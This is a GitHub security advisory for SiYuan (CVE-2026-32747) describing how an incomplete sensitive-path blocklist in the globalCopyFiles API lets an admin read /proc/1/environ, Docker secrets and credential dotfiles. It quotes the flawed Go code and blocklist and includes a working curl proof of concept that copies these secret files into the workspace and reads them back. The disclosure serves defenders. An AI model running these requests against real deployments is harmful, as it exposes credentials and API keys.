# [M] SiYuan globalCopyFiles: incomplete sensitive path blocklist allows reading /proc and Docker secrets

## Summary
Severity: Medium
Advisory: GHSA-h5vh-m7fg-w5h6
CVE: CVE-2026-32747
CWE: CWE-184, CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-h5vh-m7fg-w5h6
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0

## Details
### Summary
POST /api/file/globalCopyFiles reads source files using filepath.Abs() with no workspace boundary check, relying solely on util.IsSensitivePath() whose blocklist omits /proc/, /run/secrets/, and home directory dotfiles. An admin can copy /proc/1/environ or Docker secrets into the workspace and read them via the standard file API.

### Details
File: kernel/api/file.go - function globalCopyFiles

```go
for i, src := range srcs {
    absSrc, _ := filepath.Abs(src)

    if util.IsSensitivePath(absSrc) {
        return
    }
    srcs[i] = absSrc
}
destDir := filepath.Join(util.WorkspaceDir, destDir)
for _, src := range srcs {
    dest := filepath.Join(destDir, filepath.Base(src))
    filelock.Copy(src, dest)   // copies unchecked sensitive file into workspace
}
```

IsSensitivePath blocklist (kernel/util/path.go):
```go
prefixes := []string{"/etc/ssh", "/root", "/etc", "/var/lib/", "/."}
```

**Not blocked - exploitable targets:**
| Path | Contains |
|------|----------|
| /proc/1/environ | All env vars: DATABASE_URL, AWS_ACCESS_KEY_ID, ANTHROPIC_API_KEY |
| /run/secrets/* | Docker Swarm / Compose injected secrets |
| /home/siyuan/.aws/credentials | AWS credentials (non-root user) |
| /home/siyuan/.ssh/id_rsa | SSH private key (non-root user) |
| /tmp/ | Temporary files including tokens |

### PoC
**Environment:**
```bash
docker run -d --name siyuan -p 6806:6806 \
  -v $(pwd)/workspace:/siyuan/workspace \
  b3log/siyuan --workspace=/siyuan/workspace --accessAuthCode=test123
```

**Exploit:**
```bash
TOKEN="YOUR_ADMIN_TOKEN"

curl -s -X POST http://localhost:6806/api/file/globalCopyFiles \
  -H "Authorization: Token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"srcs":["/proc/1/environ"],"destDir":"data/assets/"}'

curl -s -X POST http://localhost:6806/api/file/getFile \
  -H "Authorization: Token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"path":"/data/assets/environ"}' | tr '\0' '\n'
```

**Docker secrets:**
```bash
curl -s -X POST http://localhost:6806/api/file/globalCopyFiles \
  -H "Authorization: Token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"srcs":["/run/secrets/db_password","/run/secrets/api_token"],"destDir":"data/assets/"}'
```

### Impact
An admin can exfiltrate any file readable by the SiYuan process that falls outside the incomplete blocklist. In containerized deployments this includes all injected secrets and environment variables - a common pattern for passing credentials to containers. The exfiltrated files are then accessible via the standard workspace file API and persist until manually deleted.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-h5vh-m7fg-w5h6
- https://nvd.nist.gov/vuln/detail/CVE-2026-32747
- https://github.com/siyuan-note/siyuan/commit/9914fd1d39e5f0a8dcc9fb587e1c0b46f31490a1
- https://github.com/siyuan-note/siyuan
- https://github.com/siyuan-note/siyuan/releases/tag/v3.6.1
